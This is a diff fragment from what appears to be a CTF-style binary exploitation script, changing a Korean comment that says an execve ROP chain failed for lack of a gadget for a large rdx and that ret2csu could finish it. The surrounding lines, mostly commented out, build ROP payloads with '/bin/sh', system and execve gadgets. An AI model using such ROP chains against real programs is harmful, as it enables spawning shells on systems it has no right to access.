@@ -129,7 +129,7 @@ pay += b'/bin/sh\x00'
 # pay += p64(system)
 # pay += p64(exit_)
 
-# rdx 값이 크고, 가젯도 없어서 못함
+# rdx 값이 크고, 가젯도 없어서 못함 -> csu로 마무리 할 수 있지만 멘탈 나감. 이게 왜 안되는지 모르겠음
 # pay = p64(pop_rax) + p64(execve)
 # pay += p64(pop_rdi) + p64(binsh)
 # pay += p64(pop_rsi) + p64(0)
